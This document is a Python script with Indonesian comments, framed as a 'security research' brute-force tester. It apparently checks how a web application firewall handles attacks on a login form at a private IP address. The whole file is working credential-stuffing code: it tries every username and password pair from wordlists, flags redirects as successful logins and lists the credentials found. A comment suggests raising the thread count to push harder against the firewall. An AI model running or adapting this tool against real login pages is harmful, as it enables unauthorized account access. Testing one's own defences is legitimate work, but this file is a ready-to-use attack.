import requests
import itertools
from tqdm import tqdm
from concurrent.futures import ThreadPoolExecutor

# --- CONFIGURATION ---
TARGET_URL = "http://10.254.56.221/login"
USER_FILE = "users.txt"
PASS_FILE = "passwords.txt"
# Anda bisa menaikkan MAX_WORKERS (misal 5 atau 10) nanti jika ingin menguji 
# seberapa kuat WAF menahan serangan concurrent (bersamaan).
MAX_WORKERS = 1  

def load_credentials(filename):
    try:
        with open(filename, "r") as f:
            return [line.strip() for line in f.readlines() if line.strip()]
    except FileNotFoundError:
        print(f"[!] File {filename} tidak ditemukan.")
        return []

def attempt_login(cred, pbar, found_list, session):
    username, password = cred
    payload = {"email": username, "password": password}
    try:
        # Timeout dinaikkan sedikit menjadi 5 detik untuk menghindari false timeout 
        # saat server sedang memproses ML
        response = session.post(TARGET_URL, data=payload, timeout=5, allow_redirects=False)
        status = response.status_code
        
        # 302 Biasanya berarti berhasil login (Redirect ke dashboard)
        if status == 302:
            pbar.write(f" [+] FOUND   ({status}): {username.ljust(20)} | {password}")
            found_list.append((username, password))
            
        # 403 Biasanya digunakan WAF untuk menolak request (Blocked)
        elif status == 403:
            pbar.write(f" [x] BLOCKED ({status}): {username.ljust(20)} | WAF Mencegat Request!")
            
        # 200 Biasanya berarti request sampai ke backend, tapi login gagal (stay di form)
        else:
            pbar.write(f" [-] FAILED  ({status}): {username.ljust(20)} | {password}")
            
    except requests.exceptions.Timeout:
        # Jika request menggantung karena WAF menahan koneksi
        pbar.write(f" [!] TIMEOUT      : Koneksi ditahan. WAF mungkin bekerja.")
    except requests.exceptions.ConnectionError:
        # Jika WAF langsung memutus/drop koneksi TCP secara paksa
        pbar.write(f" [!] CONN ERROR   : Koneksi ditolak secara paksa oleh Server/WAF.")
    except Exception as e:
        pbar.write(f" [!] ERROR ANEH   : {e}")
    finally:
        pbar.update(1)

def run_attack():
    users = load_credentials(USER_FILE)
    passwords = load_credentials(PASS_FILE)
    if not users or not passwords:
        return

    combinations = list(itertools.product(users, passwords))
    total_req = len(combinations)
    
    print("\n" + "="*65)
    print(f" SECURITY RESEARCH: BRUTE FORCE TESTER ".center(65, " "))
    print("="*65)
    print(f"[*] Target  : {TARGET_URL}")
    print(f"[*] Threads : {MAX_WORKERS} (Concurrent)")
    print(f"[*] Total   : {total_req} combinations")
    print("-" * 65)

    found_credentials = []
    
    # Session untuk Keep-Alive agar request lebih cepat
    with requests.Session() as session:
        with tqdm(total=total_req, desc="Attacking", unit="req", dynamic_ncols=True) as pbar:
            with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
                # Membagi tugas ke thread
                executor.map(lambda c: attempt_login(c, pbar, found_credentials, session), combinations)

    print("-" * 65)
    print(f"[*] Status: Attack Completed.")
    print(f"[*] Result: {len(found_credentials)} Credentials Found.")
    
    if found_credentials:
        print("\n" + " NO ".ljust(5) + "| " + "EMAIL".ljust(30) + "| " + "PASSWORD")
        print("-" * 65)
        for i, (u, p) in enumerate(found_credentials, 1):
            print(f" {str(i).ljust(4)}| {u.ljust(30)}| {p}")
    else:
        print("\n[!] No valid credentials found.")
    print("="*65 + "\n")

if __name__ == "__main__":
    run_attack()